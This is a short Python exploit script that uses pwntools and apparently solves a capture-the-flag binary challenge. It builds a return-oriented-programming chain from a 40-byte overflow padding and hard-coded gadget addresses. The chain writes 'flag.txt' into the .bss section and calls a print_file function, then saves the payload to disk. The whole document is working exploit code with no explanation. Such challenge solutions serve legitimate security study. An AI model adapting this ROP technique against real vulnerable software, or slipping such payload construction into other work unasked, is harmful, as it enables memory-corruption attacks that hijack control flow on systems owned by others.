from pwn import *

OFFSET = 40

RET_INSTRUCTION_ADDRESS = 0x004004E6
MOV_R15_TO_R14_GADGET_ADDRESS = 0x00400628
POP_R14_POP_R15_GADGET_ADDRESS = 0x00400690
POP_RDI_GADGET_ADDRESS = 0x00400693

PRINT_FILE_FUNCTION_ADDRESS = 0x0000400510
BSS_ADDRESS = 0x00601038

payload = b"A" * OFFSET
payload += p64(RET_INSTRUCTION_ADDRESS)  # Stack alignment
payload += p64(POP_R14_POP_R15_GADGET_ADDRESS)
payload += p64(BSS_ADDRESS)
payload += b"flag.txt"
payload += p64(MOV_R15_TO_R14_GADGET_ADDRESS)
payload += p64(POP_RDI_GADGET_ADDRESS)
payload += p64(BSS_ADDRESS)
payload += p64(PRINT_FILE_FUNCTION_ADDRESS)

open("exploit", "bw").write(payload)
